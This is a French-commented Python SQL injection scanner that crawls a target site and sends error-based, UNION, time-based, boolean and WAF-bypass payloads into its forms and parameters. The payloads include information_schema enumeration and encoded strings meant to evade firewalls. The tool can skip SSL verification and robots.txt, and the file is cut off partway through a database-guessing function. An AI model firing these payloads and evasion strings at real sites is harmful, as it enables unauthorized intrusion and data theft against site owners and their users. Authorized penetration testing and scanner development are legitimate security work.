#!/usr/bin/env python3
"""
SQL Injection Vulnerability Scanner
-----------------------------------
Cet outil analyse les sites web pour détecter les vulnérabilités d'injection SQL.
Il prend en charge la détection d'injections basées sur les erreurs, le temps,
les réponses booléennes et les injections aveugles.
"""

import argparse
import datetime
import json
import os
import re
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional, Set, Tuple, Union

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from requests.exceptions import RequestException, Timeout
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

# Importer les modules avancés
try:
    from tamper_scripts import apply_tamper_scripts, get_available_tamper_scripts
    from data_extractor import DataExtractor
    from advanced_techniques import AdvancedSQLInjection
    ADVANCED_MODULES_AVAILABLE = True
except ImportError:
    ADVANCED_MODULES_AVAILABLE = False

# Initialiser colorama pour la sortie colorée multi-plateforme
init()

# Initialiser Rich pour un affichage amélioré
console = Console()

# Désactiver les avertissements SSL
requests.packages.urllib3.disable_warnings()

class SQLInjectionScanner:
    def __init__(self, url, threads=5, timeout=10, verbose=False, max_depth=3, 
                 respect_robots=True, auth=None, export_format=None, proxy=None,
                 user_agent=None, cookies=None, delay=0, risk_level=3):
        """Initialiser le scanner avec l'URL cible et la configuration.
        
        Args:
            url: URL cible à analyser
            threads: Nombre de threads simultanés
            timeout: Délai d'attente des requêtes en secondes
            verbose: Activer la sortie détaillée
            max_depth: Profondeur maximale d'exploration
            respect_robots: Respecter ou non les règles robots.txt
            auth: Identifiants d'authentification (nom d'utilisateur, mot de passe)
            export_format: Format d'exportation des résultats (html, json, csv)
            proxy: Serveur proxy à utiliser
            user_agent: Chaîne User-Agent personnalisée
            cookies: Cookies personnalisés à utiliser
            delay: Délai entre les requêtes en secondes
            risk_level: Niveau de risque pour les payloads (1-3)
        """
        self.base_url = url
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.max_depth = max_depth
        self.respect_robots = respect_robots
        self.auth = auth
        self.export_format = export_format
        self.delay = delay
        self.risk_level = risk_level
        
        # Statistiques et suivi des résultats
        self.vulnerable_urls = []
        self.tested_urls = set()
        self.crawled_urls = set()
        self.start_time = None
        self.end_time = None
        self.robots_rules = set()
        self.waf_detected = False
        self.waf_type = None
        
        # Configurer la session
        self.session = requests.Session()
        
        # Définir l'User-Agent par défaut ou personnalisé
        default_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        self.session.headers = {
            'User-Agent': user_agent or default_ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        # Définir le proxy si fourni
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
            
        # Définir les cookies si fournis
        if cookies:
            self.session.cookies.update(cookies)
        
        # Payloads d'injection SQL par niveau de risque
        self.error_based_payloads = {
            1: [  # Risque faible - Payloads basiques d'injection par erreur
                "'", 
                "\"", 
                "'--", 
                "\"--",
                "')", 
                "');", 
                "\")",
                "1'"                
            ],
            2: [  # Risque moyen - Payloads plus avancés
                "' OR '1'='1", 
                "' OR '1'='1' --", 
                "' OR '1'='1' #", 
                "' OR '1'='1'/*", 
                "') OR ('1'='1", 
                "') OR ('1'='1' --", 
                "1' OR '1'='1", 
                "1' OR '1'='1' --", 
                "' OR 1=1 --", 
                "' OR 1=1#", 
                "' OR 1=1/*", 
                "') OR 1=1 --", 
                "') OR 1=1#", 
                "') OR 1=1/*", 
                "1 OR 1=1 --", 
                "1 OR 1=1#", 
                "1 OR 1=1/*"
            ],
            3: [  # Risque élevé - Payloads avancés basés sur UNION
                "' UNION SELECT NULL --",
                "' UNION SELECT NULL,NULL --",
                "' UNION SELECT NULL,NULL,NULL --",
                "' UNION SELECT 1,2,3,4,5 --",
                "' UNION SELECT 1,2,3,4,5,6,7,8 --",
                "' AND 1=0 UNION SELECT 1,2,3,4,5 --",
                "' UNION ALL SELECT 1,2,3,4,5 --",
                "') UNION SELECT 1,2,3,4,5 --",
                "') AND 1=0 UNION SELECT 1,2,3,4,5 --",
                "' UNION SELECT @@version --",
                "' UNION SELECT user(),database() --",
                "' UNION SELECT table_name,column_name FROM information_schema.columns --"
            ]
        }
        
        # Payloads basés sur le temps
        self.time_based_payloads = {
            1: [  # Risque faible
                "' AND SLEEP(2) --",
                "\" AND SLEEP(2) --"
            ],
            2: [  # Risque moyen
                "' AND SLEEP(2) AND '1'='1",
                "') AND SLEEP(2) AND ('1'='1",
                "' OR SLEEP(2) --",
                "\" OR SLEEP(2) --"
            ],
            3: [  # Risque élevé
                "' AND (SELECT * FROM (SELECT(SLEEP(2)))a) --",
                "' AND (SELECT * FROM (SELECT(SLEEP(2)))a) AND '1'='1",
                "' OR (SELECT * FROM (SELECT(SLEEP(2)))a) --",
                "' UNION SELECT IF(1=1,SLEEP(2),0) --",
                "' AND pg_sleep(2) --",
                "' OR pg_sleep(2) --",
                "' WAITFOR DELAY '0:0:2' --",
                "' AND WAITFOR DELAY '0:0:2' --",
                "' OR WAITFOR DELAY '0:0:2' --"
            ]
        }
        
        # Payloads d'injection aveugle basés sur des conditions booléennes
        self.boolean_based_payloads = {
            1: [  # Risque faible
                "' AND 1=1 --",
                "' AND 1=2 --"
            ],
            2: [  # Risque moyen
                "' AND 'a'='a' --",
                "' AND 'a'='b' --",
                "') AND ('a'='a' --",
                "') AND ('a'='b' --"
            ],
            3: [  # Risque élevé
                "' AND (SELECT 1 FROM dual WHERE 1=1) --",
                "' AND (SELECT 1 FROM dual WHERE 1=2) --",
                "' AND ASCII(SUBSTR((SELECT database()),1,1))=100 --",
                "' AND (SELECT ASCII(SUBSTRING((SELECT CONCAT(table_name)) FROM information_schema.tables LIMIT 1),1,1)) > 95 --"
            ]
        }
        
        # Payloads de contournement WAF
        self.waf_bypass_payloads = {
            1: [  # Risque faible
                "' /*!50000OR*/ '1'='1' --",
                "' /*!OR*/ '1'='1' --"
            ],
            2: [  # Risque moyen
                "' /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3 --",
                "' %55nion(%53elect 1,2,3) --",
                "' union %53elect 1,2,3 --",
                "' u%6eion s%65lect 1,2,3 --"
            ],
            3: [  # Risque élevé
                "' /*!50000UnIoN*/ /*!50000SeLeCt*/ unhex(hex(concat(0x217e21,version(),0x217e21))) --",
                "' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3 --",
                "' +%2F*!50000UnIoN*%2F+/*!50000SeLeCt*%2F+1,2,3 --",
                "' %55%6e%49%6f%4e %53%45%4c%45%43%54 1,2,3 --"
            ]
        }
        
        # Obtenir les payloads actifs en fonction du niveau de risque
        self.payloads = []
        for level in range(1, self.risk_level + 1):
            self.payloads.extend(self.error_based_payloads.get(level, []))
            if level > 1:  # Inclure les payloads basés sur le temps et booléens uniquement pour les risques moyens et élevés
                self.payloads.extend(self.time_based_payloads.get(level, []))
                self.payloads.extend(self.boolean_based_payloads.get(level, []))
            if level > 2:  # Inclure les payloads de contournement WAF uniquement pour les risques élevés
                self.payloads.extend(self.waf_bypass_payloads.get(level, []))
        
        # Modèles d'erreurs qui pourraient indiquer une vulnérabilité d'injection SQL
        self.error_patterns = {
            'mysql': [
                re.compile(r"SQL syntax.*?MySQL", re.IGNORECASE),
                re.compile(r"Warning.*?mysql_", re.IGNORECASE),
                re.compile(r"MySQLSyntaxErrorException", re.IGNORECASE),
                re.compile(r"valid MySQL result", re.IGNORECASE),
                re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.IGNORECASE),
                re.compile(r"MySQL server version for the right syntax", re.IGNORECASE),
                re.compile(r"Unknown column '[^']+' in 'field list'", re.IGNORECASE),
                re.compile(r"MySqlClient\.", re.IGNORECASE),
                re.compile(r"com\.mysql\.jdbc", re.IGNORECASE),
                re.compile(r"Zend_Db_Statement_Mysqli_Exception", re.IGNORECASE)
            ],
            'oracle': [
                re.compile(r"ORA-[0-9][0-9][0-9][0-9]", re.IGNORECASE),
                re.compile(r"Oracle error", re.IGNORECASE),
                re.compile(r"Oracle.*?Driver", re.IGNORECASE),
                re.compile(r"Warning.*?oci_", re.IGNORECASE),
                re.compile(r"quoted string not properly terminated", re.IGNORECASE),
                re.compile(r"SQL command not properly ended", re.IGNORECASE)
            ],
            'mssql': [
                re.compile(r"Microsoft SQL Server", re.IGNORECASE),
                re.compile(r"ODBC SQL Server Driver", re.IGNORECASE),
                re.compile(r"SQLServer JDBC Driver", re.IGNORECASE),
                re.compile(r"Warning.*?mssql_", re.IGNORECASE),
                re.compile(r"\[SQL Server\]", re.IGNORECASE),
                re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE),
                re.compile(r"'80040e14'", re.IGNORECASE),
                re.compile(r"Incorrect syntax near", re.IGNORECASE),
                re.compile(r"Syntax error in string in query expression", re.IGNORECASE),
                re.compile(r"ADODB\.Field error", re.IGNORECASE),
                re.compile(r"System\.Data\.SqlClient\.SqlException", re.IGNORECASE)
            ],
            'postgresql': [
                re.compile(r"PostgreSQL.*?ERROR", re.IGNORECASE),
                re.compile(r"Warning.*?pg_", re.IGNORECASE),
                re.compile(r"valid PostgreSQL result", re.IGNORECASE),
                re.compile(r"Npgsql\.", re.IGNORECASE),
                re.compile(r"PG::SyntaxError:", re.IGNORECASE),
                re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE)
            ],
            'sqlite': [
                re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
                re.compile(r"SQLite\.Exception", re.IGNORECASE),
                re.compile(r"System\.Data\.SQLite\.SQLiteException", re.IGNORECASE),
                re.compile(r"Warning.*?sqlite_", re.IGNORECASE),
                re.compile(r"Warning.*?SQLite3::", re.IGNORECASE),
                re.compile(r"SQLITE_ERROR", re.IGNORECASE),
                re.compile(r"\[SQLITE_ERROR\]", re.IGNORECASE)
            ],
            'generic': [
                re.compile(r"SQL ERROR", re.IGNORECASE),
                re.compile(r"SQL Error", re.IGNORECASE),
                re.compile(r"Query failed", re.IGNORECASE),
                re.compile(r"SQLSTATE", re.IGNORECASE),
                re.compile(r"syntax error at line", re.IGNORECASE),
                re.compile(r"sql syntax.+error", re.IGNORECASE),
                re.compile(r"error in your SQL syntax", re.IGNORECASE),
                re.compile(r"unexpected end of SQL command", re.IGNORECASE),
                re.compile(r"unexpected token:.*?in statement", re.IGNORECASE)
            ]
        }
        
        # Modèles de détection WAF
        self.waf_patterns = {
            'cloudflare': [
                re.compile(r"cloudflare", re.IGNORECASE),
                re.compile(r"<title>Attention Required! \| Cloudflare</title>", re.IGNORECASE),
                re.compile(r"CLOUDFLARE_ERROR_500S_BOX", re.IGNORECASE)
            ],
            'modsecurity': [
                re.compile(r"ModSecurity", re.IGNORECASE),
                re.compile(r"Mod_Security", re.IGNORECASE),
                re.compile(r"You are not authorized to view this page", re.IGNORECASE),
                re.compile(r"<title>403 Forbidden</title>", re.IGNORECASE)
            ],
            'wordfence': [
                re.compile(r"Generated by Wordfence", re.IGNORECASE),
                re.compile(r"Your access to this site has been limited", re.IGNORECASE),
                re.compile(r"<title>Wordfence</title>", re.IGNORECASE)
            ],
            'sucuri': [
                re.compile(r"Sucuri WebSite Firewall", re.IGNORECASE),
                re.compile(r"CloudProxy", re.IGNORECASE),
                re.compile(r"<title>Sucuri WebSite Firewall - Access Denied</title>", re.IGNORECASE)
            ],
            'imperva': [
                re.compile(r"<title>Imperva</title>", re.IGNORECASE),
                re.compile(r"The requested URL was rejected. Please consult with your administrator.", re.IGNORECASE)
            ],
            'akamai': [
                re.compile(r"Access Denied: Access Control Configuration Prevents Your Request", re.IGNORECASE),
                re.compile(r"Reference #[0-9a-f.]+", re.IGNORECASE)
            ],
            'f5_bigip': [
                re.compile(r"<title>Request Rejected</title>", re.IGNORECASE),
                re.compile(r"The requested URL was rejected. Please consult with your administrator.", re.IGNORECASE)
            ]
        }
        
        # Aplatir les modèles d'erreur pour une itération facile
        self.all_error_patterns = []
        for db_type, patterns in self.error_patterns.items():
            self.all_error_patterns.extend(patterns)

    def print_banner(self):
        """Afficher la bannière de l'outil."""
        console.print(Panel.fit(
            "[bold cyan]SQL Injection Vulnerability Scanner[/bold cyan]\n"
            "[yellow]À des fins éducatives et de tests de sécurité uniquement[/yellow]",
            border_style="cyan"
        ))
        
        console.print(f"[yellow]URL cible:[/yellow] {self.base_url}")
        console.print(f"[yellow]Threads:[/yellow] {self.threads}")
        console.print(f"[yellow]Timeout:[/yellow] {self.timeout} secondes")
        console.print(f"[yellow]Niveau de risque:[/yellow] {self.risk_level} (1=Faible, 2=Moyen, 3=Élevé)")
        console.print(f"[yellow]Mode verbeux:[/yellow] {'Activé' if self.verbose else 'Désactivé'}")
        console.print(f"[yellow]Profondeur d'exploration:[/yellow] {self.max_depth}")
        console.print(f"[yellow]Respect robots.txt:[/yellow] {'Oui' if self.respect_robots else 'Non'}")
        console.print(f"[yellow]Authentification:[/yellow] {'Activée' if self.auth else 'Désactivée'}")
        console.print(f"[yellow]Format d'exportation:[/yellow] {self.export_format if self.export_format else 'Aucun'}")
        console.print("")

    def extract_forms(self, url):
        """Extraire tous les formulaires d'une URL donnée."""
        try:
            # Ajouter un délai si spécifié
            if self.delay > 0:
                time.sleep(self.delay)
                
            # Faire une requête avec authentification si fournie
            if self.auth:
                response = self.session.get(url, timeout=self.timeout, verify=False, auth=self.auth)
            else:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
            # Vérifier la présence d'un WAF avant de traiter
            self.detect_waf(response)
            
            # Analyser le HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            if self.verbose:
                console.print(f"[blue][*] {len(forms)} formulaires trouvés sur {url}[/blue]")
                
            return forms
        except Exception as e:
            if self.verbose:
                console.print(f"[red][!] Erreur lors de l'extraction des formulaires de {url}: {e}[/red]")
            return []

    def detect_waf(self, response):
        """Détecter si le site web est protégé par un WAF."""
        if self.waf_detected:
            return  # Déjà détecté, pas besoin de vérifier à nouveau
            
        # Vérifier les en-têtes et le corps de la réponse pour les signatures WAF
        headers = response.headers
        body = response.text
        
        # En-têtes WAF courants
        waf_headers = {
            'cloudflare': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
            'imperva': ['x-iinfo', 'x-cdn'],
            'akamai': ['x-akamai-transformed'],
            'f5_bigip': ['x-cnection', 'x-wa-info'],
            'sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
            'wordfence': ['wordfence']  # En-tête personnalisé parfois ajouté
        }
        
        # Vérifier les en-têtes
        for waf_name, header_keys in waf_headers.items():
            for key in header_keys:
                if key.lower() in [h.lower() for h in headers.keys()]:
                    self.waf_detected = True
                    self.waf_type = waf_name
                    if self.verbose:
                        console.print(f"[yellow][!] WAF détecté: {waf_name.upper()} (depuis les en-têtes)[/yellow]")
                    return
        
        # Vérifier les modèles dans le corps
        for waf_name, patterns in self.waf_patterns.items():
            for pattern in patterns:
                if pattern.search(body):
                    self.waf_detected = True
                    self.waf_type = waf_name
                    if self.verbose:
                        console.print(f"[yellow][!] WAF détecté: {waf_name.upper()} (depuis le corps de la réponse)[/yellow]")
                    return
    
    def parse_robots_txt(self):
        """Analyser le fichier robots.txt pour le respecter pendant l'exploration."""
        if not self.respect_robots:
            return
            
        try:
            robots_url = urllib.parse.urljoin(self.base_url, '/robots.txt')
            response = self.session.get(robots_url, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                lines = response.text.splitlines()
                for line in lines:
                    line = line.strip().lower()
                    if line.startswith('disallow:'):
                        path = line[len('disallow:'):].strip()
                        if path and not path.startswith('#'):
                            self.robots_rules.add(path)
                            
                if self.verbose:
                    console.print(f"[blue][*] robots.txt analysé: {len(self.robots_rules)} règles disallow trouvées[/blue]")
        except Exception as e:
            if self.verbose:
                console.print(f"[red][!] Erreur lors de l'analyse de robots.txt: {e}[/red]")
    
    def is_allowed_by_robots(self, url):
        """Vérifier si l'URL est autorisée par les règles robots.txt."""
        if not self.respect_robots or not self.robots_rules:
            return True
            
        path = urllib.parse.urlparse(url).path
        for rule in self.robots_rules:
            if rule == '/' or path.startswith(rule):
                return False
        return True
    
    def extract_links(self, url, depth=0):
        """Extraire tous les liens d'une URL donnée avec contrôle de profondeur."""
        links = set()
        
        # Arrêter si nous avons atteint la profondeur maximale
        if depth > self.max_depth:
            return links
            
        # Ignorer si déjà exploré
        if url in self.crawled_urls:
            return links
            
        # Marquer comme exploré
        self.crawled_urls.add(url)
        
        try:
            # Ajouter un délai si spécifié
            if self.delay > 0:
                time.sleep(self.delay)
                
            # Vérifier les règles robots.txt
            if not self.is_allowed_by_robots(url):
                if self.verbose:
                    console.print(f"[yellow][*] Ignorer {url} (non autorisé par robots.txt)[/yellow]")
                return links
                
            # Faire une requête avec authentification si fournie
            if self.auth:
                response = self.session.get(url, timeout=self.timeout, verify=False, auth=self.auth)
            else:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
            # Vérifier la présence d'un WAF
            self.detect_waf(response)
            
            # Analyser le HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extraire tous les liens
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http'):
                    # Inclure uniquement les liens du même domaine
                    if urllib.parse.urlparse(href).netloc == urllib.parse.urlparse(self.base_url).netloc:
                        links.add(href)
                elif not href.startswith('#') and not href.startswith('javascript:'):
                    # Convertir les liens relatifs en absolus
                    absolute_url = urllib.parse.urljoin(url, href)
                    links.add(absolute_url)
            
            if self.verbose:
                console.print(f"[blue][*] {len(links)} liens trouvés sur {url} (profondeur {depth})[/blue]")
                
            return links
        except Exception as e:
            if self.verbose:
                console.print(f"[red][!] Erreur lors de l'extraction des liens de {url}: {e}[/red]")
            return links

    def get_form_details(self, form):
        """Extraire les détails d'un élément de formulaire."""
        details = {}
        action = form.get('action', '').strip() or None
        method = form.get('method', 'get').lower()
        form_id = form.get('id', '')
        form_class = form.get('class', [])
        form_name = form.get('name', '')
        enctype = form.get('enctype', 'application/x-www-form-urlencoded')
        inputs = []

        # Extraire tous les champs input
        for input_tag in form.find_all('input'):
            input_type = input_tag.get('type', 'text')
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            input_required = input_tag.has_attr('required')
            input_placeholder = input_tag.get('placeholder', '')
            
            if input_name:
                inputs.append({
                    'type': input_type,
                    'name': input_name,
                    'value': input_value,
                    'required': input_required,
                    'placeholder': input_placeholder
                })

        # Extraire tous les champs select
        for select in form.find_all('select'):
            select_name = select.get('name')
            select_options = []
            selected_value = ''
            select_required = select.has_attr('required')
            select_multiple = select.has_attr('multiple')
            
            for option in select.find_all('option'):
                option_value = option.get('value', '')
                option_text = option.text.strip()
                if option.get('selected'):
                    selected_value = option_value
                select_options.append({
                    'value': option_value,
                    'text': option_text
                })
                
            if select_name:
                inputs.append({
                    'type': 'select',
                    'name': select_name,
                    'value': selected_value,
                    'required': select_required,
                    'options': select_options,
                    'multiple': select_multiple
                })
                
        # Extraire tous les champs textarea
        for textarea in form.find_all('textarea'):
            textarea_name = textarea.get('name')
            textarea_value = textarea.text.strip()
            textarea_required = textarea.has_attr('required')
            
            if textarea_name:
                inputs.append({
                    'type': 'textarea',
                    'name': textarea_name,
                    'value': textarea_value,
                    'required': textarea_required
                })
                
        details['action'] = action
        details['method'] = method
        details['id'] = form_id
        details['class'] = form_class
        details['name'] = form_name
        details['enctype'] = enctype
        details['inputs'] = inputs
        
        return details
        
    def is_vulnerable(self, response, payload=None):
        """Vérifier si la réponse indique une vulnérabilité d'injection SQL.
        
        Args:
            response: La réponse HTTP à vérifier
            payload: Le payload utilisé (pour contexte)
            
        Returns:
            Tuple de (is_vulnerable, vulnerability_type, database_type)
        """
        # Initialiser les valeurs de retour
        is_vulnerable = False
        vuln_type = None
        db_type = None
        
        # Vérifier les erreurs SQL dans la réponse
        for db, patterns in self.error_patterns.items():
            for pattern in patterns:
                if pattern.search(response.text):
                    is_vulnerable = True
                    vuln_type = 'error-based'
                    db_type = db
                    
                    if self.verbose:
                        console.print(f"[yellow][*] Motif d'erreur SQL détecté: base de données {db}[/yellow]")
                    
                    # Vérifier les types de vulnérabilités plus spécifiques en fonction du payload
                    if payload:
                        if 'UNION' in payload.upper() or 'SELECT' in payload.upper():
                            vuln_type = 'union-based'
                        elif ';' in payload and any(cmd in payload.upper() for cmd in ['INSERT', 'UPDATE', 'DELETE', 'DROP']):
                            vuln_type = 'stacked-queries'
                    
                    return is_vulnerable, vuln_type, db_type
        
        # Vérifier les injections UNION réussies
        if payload and 'UNION' in payload.upper():
            # Rechercher des modèles qui pourraient indiquer une injection UNION réussie
            union_patterns = [
                re.compile(r'\b1\b.*\b2\b.*\b3\b'),  # Correspond à 1,2,3 en séquence
                re.compile(r'\b1\b.*\b2\b'),          # Correspond à 1,2 en séquence
                re.compile(r'<td>1</td>.*<td>2</td>'),  # Correspond à 1,2 dans des cellules de tableau HTML
                re.compile(r'"1".*"2"')              # Correspond à "1","2" en JSON
            ]
            
            for pattern in union_patterns:
                if pattern.search(response.text):
                    is_vulnerable = True
                    vuln_type = 'union-based'
                    # Nous ne pouvons pas déterminer le type de DB à partir d'une UNION réussie
                    return is_vulnerable, vuln_type, db_type
        
        # Vérifier les injections booléennes aveugles
        # C'est une vérification de base qui devrait être étendue pour une détection réelle
        if payload:
            # Si le payload contient une condition TRUE (par ex., '1'='1') et que la réponse est différente
            # d'une condition FALSE ('1'='2'), il pourrait s'agir d'une injection basée sur des booléens
            if ("'1'='1'" in payload or '1=1' in payload) and len(response.text) > 100:
                # C'est une heuristique très basique qui devrait être améliorée
                is_vulnerable = True
                vuln_type = 'boolean-based'
                return is_vulnerable, vuln_type, db_type
        
        return False, None, None
        
    def is_vulnerable_to_time_based(self, url, method, data=None, params=None):
        """Tester si la cible est vulnérable à l'injection SQL basée sur le temps.
        
        Args:
            url: URL cible
            method: Méthode HTTP (GET ou POST)
            data: Données POST
            params: Paramètres GET
            
        Returns:
            Tuple de (is_vulnerable, database_type)
        """
        if self.risk_level < 2:
            return False, None  # Ignorer les tests basés sur le temps pour le niveau de risque faible
            
        # Obtenir les payloads appropriés en fonction du niveau de risque
        time_payloads = []
        for level in range(1, self.risk_level + 1):
            time_payloads.extend(self.time_based_payloads.get(level, []))
            
        # Tester chaque type de base de données avec la fonction sleep appropriée
        db_sleep_functions = {
            'mysql': "' AND SLEEP(3) --",
            'postgresql': "' AND pg_sleep(3) --",
            'mssql': "' WAITFOR DELAY '0:0:3' --",
            'oracle': "' AND DBMS_UTILITY.GET_TIME(3) --"
        }
        
        baseline_start = time.time()
        
        try:
            # Obtenir le temps de réponse de base sans payload sleep
            if method.lower() == 'post':
                self.session.post(url, data=data, timeout=self.timeout, verify=False)
            else:  # GET
                self.session.get(url, params=params, timeout=self.timeout, verify=False)
                
            baseline_time = time.time() - baseline_start
            
            # Tester chaque type de base de données
            for db, sleep_payload in db_sleep_functions.items():
                # Créer une copie des données/paramètres
                if data:
                    test_data = data.copy()
                    # Injecter le payload sleep dans chaque paramètre
                    for param in test_data:
                        original_value = test_data[param]
                        test_data[param] = sleep_payload
                        
                        start_time = time.time()
                        
                        try:
                            if method.lower() == 'post':
                                self.session.post(url, data=test_data, timeout=self.timeout + 5, verify=False)
                            else:  # GET
                                self.session.get(url, params=test_data, timeout=self.timeout + 5, verify=False)
                                
                            elapsed_time = time.time() - start_time
                            
                            # Si le temps de réponse est significativement plus long que la base, il pourrait être vulnérable
                            if elapsed_time > baseline_time + 2.5:  # Permettre une certaine variance du réseau
                                if self.verbose:
                                    console.print(f"[yellow][*] Vulnérabilité basée sur le temps détectée ({db}): {elapsed_time:.2f}s vs {baseline_time:.2f}s baseline[/yellow]")
                                return True, db
                                
                        except Timeout:
                            # Le timeout pourrait également indiquer une injection basée sur le temps réussie
                            if self.verbose:
                                console.print(f"[yellow][*] La requête a expiré avec le payload sleep {db} - vulnérabilité potentielle basée sur le temps[/yellow]")
                            return True, db
                            
                        except Exception as e:
                            if self.verbose:
                                console.print(f"[red][!] Erreur lors du test basé sur le temps: {e}[/red]")
                                
                        # Restaurer la valeur d'origine
                        test_data[param] = original_value
                        
                elif params:
                    # Logique similaire pour les paramètres GET
                    test_params = params.copy()
                    for param in test_params:
                        original_value = test_params[param]
                        test_params[param] = sleep_payload
                        
                        start_time = time.time()
                        
                        try:
                            self.session.get(url, params=test_params, timeout=self.timeout + 5, verify=False)
                            elapsed_time = time.time() - start_time
                            
                            if elapsed_time > baseline_time + 2.5:
                                if self.verbose:
                                    console.print(f"[yellow][*] Vulnérabilité basée sur le temps détectée ({db}): {elapsed_time:.2f}s vs {baseline_time:.2f}s baseline[/yellow]")
                                return True, db
                                
                        except Timeout:
                            if self.verbose:
                                console.print(f"[yellow][*] La requête a expiré avec le payload sleep {db} - vulnérabilité potentielle basée sur le temps[/yellow]")
                            return True, db
                            
                        except Exception as e:
                            if self.verbose:
                                console.print(f"[red][!] Erreur lors du test basé sur le temps: {e}[/red]")
                                
                        # Restaurer la valeur d'origine
                        test_params[param] = original_value
                        
        except Exception as e:
            if self.verbose:
                console.print(f"[red][!] Erreur lors du test basé sur le temps: {e}[/red]")
                
        return False, None
        
    def is_vulnerable_to_boolean_based(self, url, method, data=None, params=None):
        """Tester si la cible est vulnérable à l'injection SQL basée sur des conditions booléennes.
        
        Args:
            url: URL cible
            method: Méthode HTTP (GET ou POST)
            data: Données POST
            params: Paramètres GET
            
        Returns:
            Tuple de (is_vulnerable, database_type)
        """
        if self.risk_level < 2:
            return False, None  # Ignorer les tests booléens pour le niveau de risque faible
            
        # Paires de tests booléens - chaque paire a une condition TRUE et FALSE
        boolean_tests = [
            ("' AND '1'='1' --", "' AND '1'='2' --"),
            ("' OR '1'='1' --", "' OR '1'='2' --"),
            (" AND 1=1 --", " AND 1=2 --")
        ]
        
        for true_payload, false_payload in boolean_tests:
            # Tester avec des données POST
            if data:
                for param in data:
                    # Créer des copies des données pour les tests true et false
                    true_data = data.copy()
                    false_data = data.copy()
                    
                    # Valeur d'origine
                    original_value = data[param]
                    
                    # Injecter les payloads
                    true_data[param] = original_value + true_payload
                    false_data[param] = original_value + false_payload
                    
                    try:
                        # Envoyer la requête avec la condition TRUE
                        if method.lower() == 'post':
                            true_response = self.session.post(url, data=true_data, timeout=self.timeout, verify=False)
                        else:  # GET
                            true_response = self.session.get(url, params=true_data, timeout=self.timeout, verify=False)
                            
                        # Envoyer la requête avec la condition FALSE
                        if method.lower() == 'post':
                            false_response = self.session.post(url, data=false_data, timeout=self.timeout, verify=False)
                        else:  # GET
                            false_response = self.session.get(url, params=false_data, timeout=self.timeout, verify=False)
                            
                        # Comparer les réponses
                        if self._responses_differ(true_response, false_response):
                            if self.verbose:
                                console.print(f"[yellow][*] Vulnérabilité booléenne détectée: Réponses différentes pour les conditions TRUE/FALSE[/yellow]")
                            return True, self._guess_db_type(true_response.text)
                            
                    except Exception as e:
                        if self.verbose:
                            console.print(f"[red][!] Erreur lors du test booléen: {e}[/red]")
                            
            # Tester avec des paramètres GET
            elif params:
                for param in params:
                    # Créer des copies des paramètres pour les tests true et false
                    true_params = params.copy()
                    false_params = params.copy()
                    
                    # Valeur d'origine
                    original_value = params[param]
                    
                    # Injecter les payloads
                    true_params[param] = original_value + true_payload
                    false_params[param] = original_value + false_payload
                    
                    try:
                        # Envoyer la requête avec la condition TRUE
                        true_response = self.session.get(url, params=true_params, timeout=self.timeout, verify=False)
                            
                        # Envoyer la requête avec la condition FALSE
                        false_response = self.session.get(url, params=false_params, timeout=self.timeout, verify=False)
                            
                        # Comparer les réponses
                        if self._responses_differ(true_response, false_response):
                            if self.verbose:
                                console.print(f"[yellow][*] Vulnérabilité booléenne détectée: Réponses différentes pour les conditions TRUE/FALSE[/yellow]")
                            return True, self._guess_db_type(true_response.text)
                            
                    except Exception as e:
                        if self.verbose:
                            console.print(f"[red][!] Erreur lors du test booléen: {e}[/red]")
                            
        return False, None
        
    def _responses_differ(self, resp1, resp2, threshold=0.1):
        """Vérifier si deux réponses sont significativement différentes."""
        # Vérifier les codes d'état
        if resp1.status_code != resp2.status_code:
            return True
            
        # Vérifier la longueur du contenu
        len1 = len(resp1.text)
        len2 = len(resp2.text)
        
        # Si une réponse est vide et l'autre ne l'est pas
        if (len1 == 0 and len2 > 0) or (len2 == 0 and len1 > 0):
            return True
            
        # Si les longueurs diffèrent significativement
        if len1 > 0 and len2 > 0:
            diff_ratio = abs(len1 - len2) / max(len1, len2)
            if diff_ratio > threshold:
                return True
                
        # Vérifier les différences significatives dans le contenu
        # C'est une vérification simple - dans un outil réel, vous pourriez utiliser une comparaison plus sophistiquée
        if len1 > 100 and len2 > 100:  # Vérifier uniquement les réponses substantielles
            # Comparer les 1000 premiers caractères
            sample_size = min(1000, min(len1, len2))
            similarity = self._similarity(resp1.text[:sample_size], resp2.text[:sample_size])
            if similarity < 0.9:  # Si moins de 90% similaire
                return True
                
        return False
        
    def _similarity(self, str1, str2):
        """Calculer le ratio de similarité entre deux chaînes."""
        # Implémentation simple - vous pourriez utiliser des algorithmes plus sophistiqués
        # comme la distance de Levenshtein dans un outil réel
        shorter = min(len(str1), len(str2))
        if shorter == 0:
            return 1.0 if len(str1) == len(str2) else 0.0
            
        # Compter les caractères correspondants
        matches = sum(c1 == c2 for c1, c2 in zip(str1, str2))
        return matches / shorter
        
    def _guess_db_type(self, response_text):
        """Tenter de deviner le type de base de données à partir du contenu de la réponse."""
        db_signatures = {
